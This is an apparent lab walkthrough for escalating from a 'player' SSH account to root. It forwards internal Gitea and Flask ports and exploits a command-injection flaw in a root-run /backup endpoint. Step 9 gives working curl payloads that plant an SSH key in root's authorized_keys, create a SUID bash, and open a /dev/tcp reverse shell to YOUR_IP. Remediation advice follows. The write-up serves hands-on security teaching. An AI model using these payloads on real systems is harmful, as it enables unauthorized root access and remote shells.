# Privilege Escalation Lab - Walkthrough

## Scenario
You've obtained SSH access as the `player` user. Your goal is to escalate to root and read the flag at `/root/flag.txt`.

## Solution Path

### Step 1: Initial Reconnaissance

Login as player:
```bash
ssh player@localhost -p 2222
# Password: player
```

Use this command to get user's flag
```bash
cat user.txt
```

Check running processes:
```bash
ps aux
```

You'll notice several services running including Gitea and a Python Flask app.

### Step 2: Network Enumeration

Check listening ports:
```bash
netstat -tulpn
# or
ss -tulpn
```

You should see:
- Port 22 (SSH) - accessible
- Port 3000 (Gitea) - localhost only
- Port 5000 (Flask app) - localhost only

### Step 3: Port Forwarding

Forward the Gitea port to your local machine:
```bash
# From your local terminal
ssh -L 3000:127.0.0.1:3000 player@localhost -p 2222
```

### Step 4: Access Gitea

Open browser and navigate to:
```
http://localhost:3000
```

### Step 5: Code Review

Browse the `backend` repository. You'll find:

**app.py** - Contains a vulnerable Flask application with:
- `/backup` endpoint that accepts JSON
- Command injection vulnerability using `shell=True`
- Runs tar commands with user-controlled input

**README.md** - Shows the Flask app runs on port 5000

### Step 6: Check Sudo Privileges

Check what privileges the backup service might have:

```bash
ps aux | grep python
# You'll see the Flask app running as root!
```

This is a **critical misconfiguration** - the backup service runs as root instead of using least privilege principles.

### Step 7: Exploit Command Injection

Forward port 5000 to access the Flask app:
```bash
ssh -L 5000:127.0.0.1:5000 player@localhost -p 2222
```

Test the vulnerable endpoint:
```bash
curl -X POST http://localhost:5000/backup \
  -H "Content-Type: application/json" \
  -d '{"path": "/var/log", "destination": "/tmp/test"}'
```

### Step 8: Command Injection to Root

The README claims the app is secure with "path traversal protection" and "command injection mitigation", but this is a false sense of security!

The vulnerability is subtle. The code blocks `;` and `&` in the path/destination, but there are OTHER ways to inject commands:

**Attack vectors that bypass the filters:**

1. **Newline injection** - Use `%0a` (URL encoded newline)
2. **Command substitution** - Use `$(command)` or `` `command` ``
3. **Pipe operator** - Not filtered, can use `|`

The critical line:
```python
command = f"tar -czf {destination}.tar.gz {path}"
```

And the app runs as **root** (check with `ps aux | grep python`)!

Notice the injection happens AFTER the `.tar.gz` extension is added to destination!

### Step 9: Get a Root Shell

For a persistent root shell, we can use several methods:

**Method 1: Add SSH key to root**
```bash
curl -X POST http://localhost:5000/backup \
  -H "Content-Type: application/json" \
  -d '{"path": "/var/log", "destination": "/tmp/x $(echo your-ssh-public-key >> /root/.ssh/authorized_keys)"}'
```

**Method 2: SUID binary**
```bash
curl -X POST http://localhost:5000/backup \
  -H "Content-Type: application/json" \
  -d '{"path": "/var/log", "destination": "/tmp/x $(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)"}'
```

Then:
```bash
/tmp/rootbash -p
```

**Method 3: Direct root shell via netcat (if available)**
```bash
# On your machine
nc -lvnp 4444

# Exploit
curl -X POST http://localhost:5000/backup \
  -H "Content-Type: application/json" \
  -d '{"path": "/var/log", "destination": "/tmp/x $(bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\")"}'
```

## Key Vulnerabilities

1. **Information Disclosure**: Gitea exposes vulnerable Flask source code and architecture details
2. **Insufficient Input Validation**: Blocks `;` and `&` but allows `$()`, `` ` ``, `|`, and newline injection
3. **Command Injection**: Uses `subprocess.run()` with `shell=True` and user input
4. **Excessive Privileges**: Backup service runs as root
5. **False Security**: Fake security audit in README creates false confidence

## Learning Points

- Enumerate services and open ports thoroughly
- Review source code when accessible - don't trust security claims
- Incomplete input validation is as dangerous as none
- Never use `shell=True` with user input
- Never run web services as root - use least privilege
- Blacklist filtering is fundamentally flawed
- Port forwarding exposes internal services

## Remediation

1. Never use `shell=True` - use argument lists: `subprocess.run(['tar', '-czf', dest, path])`
2. Implement whitelist validation, not blacklists
3. Run services with minimal required privileges
4. Use path allowlists for valid directories
5. Implement authentication and rate limiting
6. Don't expose source code publicly
7. Remove fake security audit claims